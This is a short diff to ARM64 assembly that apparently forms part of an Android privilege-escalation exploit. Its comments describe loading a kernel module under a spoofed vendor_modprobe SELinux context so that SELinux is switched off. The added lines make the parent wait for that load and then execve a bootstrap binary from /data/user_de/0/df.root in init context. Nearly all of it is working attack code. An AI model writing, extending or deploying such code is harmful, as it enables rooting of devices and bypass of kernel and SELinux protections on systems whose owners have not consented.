@@ -27,6 +27,8 @@ ko_target:
     .global libcxx_ko_target_off
 libcxx_ko_target_off:
     .int ko_target - libcxx_data
+bootstrap_path:
+    .asciz "/data/user_de/0/df.root/bootstrap"
 
     .align 4
 
@@ -97,7 +99,7 @@ libcxx_start:
     mov     x4, xzr
     mov     x8, #SYS_clone
     svc     0
-    cbnz    w0, myexit
+    cbnz    w0, worker_wait
 
     // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
     // open /proc/self/attr/exec
@@ -124,6 +126,23 @@ libcxx_start:
     svc     0
 
     b       myexit
+
+worker_wait:
+    // wait4(grandchild_pid, NULL, 0, NULL) — blocks until insmod exits (LKM done, SELinux off)
+    mov     x1, xzr
+    mov     x2, xzr
+    mov     x3, xzr
+    mov     x8, #SYS_wait4
+    svc     0
+
+    // execve bootstrap in init context
+    adr     x0, bootstrap_path
+    str     x0, [sp]
+    str     xzr, [sp, 8]
+    mov     x1, sp
+    mov     x2, xzr
+    mov     x8, #SYS_execve
+    svc     0
 
 myexit:
     mov     x0, #1
